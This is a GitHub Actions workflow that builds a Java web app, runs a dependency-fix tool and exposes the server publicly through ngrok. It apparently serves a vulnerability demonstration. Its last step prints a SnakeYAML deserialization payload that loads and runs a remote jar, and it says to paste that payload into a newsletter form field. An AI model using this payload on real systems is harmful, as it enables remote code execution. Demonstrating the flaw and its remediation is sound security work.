name: "Build and run"

on:
  pull_request:
  workflow_dispatch:

jobs:
  build-and-run:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
    - uses: actions/checkout@v4
    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        distribution: 'temurin'
        java-version: '17'
        cache: 'maven'
    - name: Resolve dependencies
      run: mvn dependency:resolve
    - name: seal cli
      uses: seal-community/cli-action@latest
      with:
        mode: fix
        fix_mode: remote
        token: ${{ secrets.SEAL_TOKEN }}
        project: 56078781DA8B1F204F5779B833E3F6D8A39EE0F9
        target: pom.xml
    - name: Build Application
      run: mvn clean package -DskipTests
    - name: Run Server with ngrok
      run: |
        wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
        tar xvzf ngrok-v3-stable-linux-amd64.tgz
        ./ngrok config add-authtoken ${{ secrets.NGROK_TOKEN }}
        ./ngrok http --url=${{ secrets.NGROK_DOMAIN }} 8080 &
        sleep 3
        echo "App:     https://${{ secrets.NGROK_DOMAIN }}"
        echo "Payload: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"https://raw.githubusercontent.com/seal-sean-org/yaml-payload/main/yaml-payload.jar\"]]]]"
        echo "Paste the payload into the newsletter name field and click Unlock"
        java -jar target/seans-surf-and-skate-1.0.0.jar
